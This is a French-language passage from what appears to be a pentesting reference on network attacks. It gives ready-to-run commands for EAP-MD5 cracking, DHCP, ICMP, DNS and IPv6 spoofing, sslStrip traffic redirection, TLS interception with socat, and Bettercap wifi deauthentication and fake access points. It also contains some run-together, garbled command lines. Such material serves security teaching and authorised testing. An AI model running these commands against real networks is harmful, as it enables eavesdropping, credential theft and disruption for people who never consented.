### **Attaques EAP**

Voici quelques-unes des tactiques d'attaque qui peuvent être utilisées contre les implémentations 802.1X :

- Grattage actif de mots de passe par force brute via EAP
- Attaque du serveur RADIUS avec un contenu EAP malformé _\*\*_(exploits)
- Capture de messages EAP et craquage de mots de passe hors ligne (EAP-MD5 et PEAP)
- Forçage de l'authentification EAP-MD5 pour contourner la validation du certificat TLS
- Injection de trafic réseau malveillant lors de l'authentification en utilisant un hub ou similaire

Si l'attaquant se trouve entre la victime et le serveur d'authentification, il pourrait essayer de dégrader (si nécessaire) le protocole d'authentification à EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait procéder à un craquage par force brute en utilisant :
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles réseau conçus pour **créer un système de routage redondant à chaud**. Avec FHRP, des routeurs physiques peuvent être combinés en un seul dispositif logique, ce qui augmente la tolérance aux pannes et aide à répartir la charge.

**Les ingénieurs de Cisco Systems ont développé deux protocoles FHRP, GLBP et HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Trois versions du protocole de routage RIP (Routing Information Protocol) sont connues : RIP, RIPv2 et RIPng. Les datagrammes sont envoyés aux pairs via le port 520 en utilisant UDP par RIP et RIPv2, tandis que les datagrammes sont diffusés au port UDP 521 via multicast IPv6 par RIPng. Le support pour l'authentification MD5 a été introduit par RIPv2. D'autre part, l'authentification native n'est pas incorporée par RIPng ; au lieu de cela, on s'appuie sur des en-têtes IPsec AH et ESP optionnels dans IPv6.

- **RIP et RIPv2 :** La communication se fait par des datagrammes UDP sur le port 520.
- **RIPng :** Utilise le port UDP 521 pour diffuser des datagrammes via multicast IPv6.

Notez que RIPv2 prend en charge l'authentification MD5 tandis que RIPng n'inclut pas d'authentification native, s'appuyant sur des en-têtes IPsec AH et ESP dans IPv6.

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole à vecteur de distance.** S'il n'y a **pas d'authentification** et de configuration des interfaces passives, un **intrus** peut interférer avec le routage EIGRP et provoquer un **empoisonnement des tables de routage**. De plus, le réseau EIGRP (en d'autres termes, le système autonome) **est plat et n'a pas de segmentation en zones**. Si un **attaquant injecte une route**, il est probable que cette route **se propage** dans tout le système EIGRP autonome.

Attaquer un système EIGRP nécessite **d'établir un voisinage avec un routeur EIGRP légitime**, ce qui ouvre de nombreuses possibilités, de la reconnaissance de base à diverses injections.

[**FRRouting**](https://frrouting.org/) vous permet de mettre en œuvre **un routeur virtuel qui prend en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Tout ce que vous avez à faire est de le déployer sur le système de votre attaquant et vous pouvez en fait prétendre être un routeur légitime dans le domaine de routage.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) a des capacités pour intercepter les diffusions EIGRP (Enhanced Interior Gateway Routing Protocol). Il permet également l'injection de paquets, qui peuvent être utilisés pour modifier les configurations de routage.

### OSPF

Dans le protocole Open Shortest Path First (OSPF), **l'authentification MD5 est couramment utilisée pour garantir une communication sécurisée entre les routeurs**. Cependant, cette mesure de sécurité peut être compromise à l'aide d'outils comme Loki et John the Ripper. Ces outils sont capables de capturer et de casser des hachages MD5, exposant la clé d'authentification. Une fois cette clé obtenue, elle peut être utilisée pour introduire de nouvelles informations de routage. Pour configurer les paramètres de route et établir la clé compromise, les onglets _Injection_ et _Connection_ sont utilisés, respectivement.

- **Capturer et casser des hachages MD5 :** Des outils tels que Loki et John the Ripper sont utilisés à cette fin.
- **Configurer les paramètres de route :** Cela se fait via l'onglet _Injection_.
- **Définir la clé compromise :** La clé est configurée sous l'onglet _Connection_.

### Autres outils et sources génériques

- [**Above**](https://github.com/c4s73r/Above) : Outil pour scanner le trafic réseau et trouver des vulnérabilités
- Vous pouvez trouver **plus d'informations sur les attaques réseau** [**ici**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaquant configure tous les paramètres réseau (GW, IP, DNS) du nouveau membre du réseau en envoyant de fausses réponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Vérifiez la [section précédente](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste à envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur moyen d'atteindre une IP. Ensuite, lorsque la victime souhaite contacter l'IP, elle enverra le paquet via l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant résoudra certains (ou tous) les domaines que la victime demande.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles Locales

Plusieurs routes vers des systèmes et des réseaux existent souvent. Après avoir établi une liste d'adresses MAC au sein du réseau local, utilisez _gateway-finder.py_ pour identifier les hôtes qui prennent en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, et mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pour la résolution locale des hôtes lorsque les recherches DNS échouent, les systèmes Microsoft s'appuient sur **Link-Local Multicast Name Resolution (LLMNR)** et le **NetBIOS Name Service (NBT-NS)**. De même, **Apple Bonjour** et les implémentations **Linux zero-configuration** utilisent **Multicast DNS (mDNS)** pour découvrir des systèmes au sein d'un réseau. En raison de la nature non authentifiée de ces protocoles et de leur fonctionnement sur UDP, en diffusant des messages, ils peuvent être exploités par des attaquants cherchant à rediriger les utilisateurs vers des services malveillants.

Vous pouvez usurper des services recherchés par des hôtes en utilisant Responder pour envoyer de fausses réponses.\
Lisez ici plus d'informations sur [comment usurper des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les navigateurs utilisent couramment le **protocole Web Proxy Auto-Discovery (WPAD) pour acquérir automatiquement les paramètres de proxy**. Cela implique de récupérer des détails de configuration à partir d'un serveur, spécifiquement via une URL telle que "http://wpad.example.org/wpad.dat". La découverte de ce serveur par les clients peut se faire par divers mécanismes :

- Par **DHCP**, où la découverte est facilitée en utilisant une entrée de code spécial 252.
- Par **DNS**, ce qui implique de rechercher un nom d'hôte étiqueté _wpad_ dans le domaine local.
- Via **Microsoft LLMNR et NBT-NS**, qui sont des mécanismes de secours utilisés lorsque les recherches DNS échouent.

L'outil Responder tire parti de ce protocole en agissant comme un **serveur WPAD malveillant**. Il utilise DHCP, DNS, LLMNR et NBT-NS pour induire les clients en erreur afin qu'ils se connectent à lui. Pour approfondir comment les services peuvent être usurpés en utilisant Responder [vérifiez ceci](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP et appareils UPnP](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez offrir différents services dans le réseau pour essayer de **tromper un utilisateur** afin qu'il entre des **identifiants en texte clair**. **Plus d'informations sur cette attaque dans** [**Spoofing SSDP et UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### Spoofing de voisinage IPv6

Cette attaque est très similaire au spoofing ARP mais dans le monde IPv6. Vous pouvez amener la victime à penser que l'IPv6 du GW a le MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Certains systèmes d'exploitation configurent par défaut la passerelle à partir des paquets RA envoyés dans le réseau. Pour déclarer l'attaquant comme routeur IPv6, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Par défaut, certains systèmes d'exploitation essaient de configurer le DNS en lisant un paquet DHCPv6 sur le réseau. Ensuite, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer lui-même en tant que DNS. Le DHCP fournit également une IPv6 à la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (page factice et injection de code JS)

## Attaques Internet

### sslStrip

Fondamentalement, ce que cette attaque fait, c'est que, dans le cas où l'**utilisateur** essaie d'**accéder** à une page **HTTP** qui est **redirigée** vers la version **HTTPS**. **sslStrip** va **maintenir** une **connexion HTTP avec** le **client et** une **connexion HTTPS avec** le **serveur** afin qu'il puisse **sniffer** la connexion en **texte clair**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'infos [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **différence** entre **sslStrip+ et dns2proxy** par rapport à **sslStrip** est qu'ils **redirigeront** par exemple _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **supplémentaire** "**w**") et définiront l'**adresse de ce domaine comme l'IP de l'attaquant**. De cette manière, le **client** se **connectera** à _**wwww.facebook.com**_ **(l'attaquant)** mais en arrière-plan **sslstrip+** **maintiendra** la **vraie connexion** via https avec **www.facebook.com**.

Le **but** de cette technique est d'**éviter HSTS** car _**wwww**.facebook.com_ **ne sera pas** enregistré dans le **cache** du navigateur, donc le navigateur sera trompé pour effectuer **l'authentification facebook en HTTP**.\
Notez que pour réaliser cette attaque, la victime doit d'abord essayer d'accéder à [http://www.faceook.com](http://www.faceook.com) et non https. Cela peut être fait en modifiant les liens à l'intérieur d'une page http.

Plus d'infos [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionnent plus. Cela est dû au fait qu'il y a des règles HSTS préenregistrées dans les navigateurs, donc même si c'est la première fois qu'un utilisateur accède à un domaine "important", il y accédera via HTTPS. De plus, notez que les règles préenregistrées et d'autres règles générées peuvent utiliser le drapeau** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple de** _**wwww.facebook.com**_ **d'avant ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP écoute sur le port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL écoute sur le port

#### Générer des clés et un certificat auto-signé
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Écouter en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Écouter en utilisant un certificat et rediriger vers les hôtes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client vérifie que le CA est valide, vous pourriez **servir un certificat d'un autre nom d'hôte signé par un CA**.\
Un autre test intéressant est de servir un **certificat du nom d'hôte demandé mais auto-signé**.

D'autres choses à tester sont d'essayer de signer le certificat avec un certificat valide qui n'est pas un CA valide. Ou d'utiliser la clé publique valide, forcer l'utilisation d'un algorithme comme Diffie-Hellman (un qui n'a pas besoin de déchiffrer quoi que ce soit avec la vraie clé privée) et lorsque le client demande une preuve de la vraie clé privée (comme un hachage), envoyer une fausse preuve et s'attendre à ce que le client ne vérifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes de découverte active

Prenez en compte que lorsqu'un paquet UDP est envoyé à un appareil qui n'a pas le port demandé, un ICMP (Port Inaccessible) est envoyé.

### **Découverte ARP**

Les paquets ARP sont utilisés pour découvrir quelles adresses IP sont utilisées dans le réseau. Le PC doit envoyer une requête pour chaque adresse IP possible et seules celles qui sont utilisées répondront.

### **mDNS (DNS multicast)**

Bettercap envoie une requête MDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet répond généralement à cette requête. Ensuite, elle recherche uniquement les machines répondant à "services".

**Outils**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (Serveur de noms NetBios)**

Bettercap diffuse des paquets sur le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocole de découverte de services simple)**

Bettercap diffuse des paquets SSDP à la recherche de tous types de services (Port UDP 1900).

### **WSD (Découverte de services Web)**

Bettercap diffuse des paquets WSD à la recherche de services (Port UDP 3702).

## Références

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Évaluation de la sécurité du réseau : Connaître votre réseau (3e édition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. Par Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
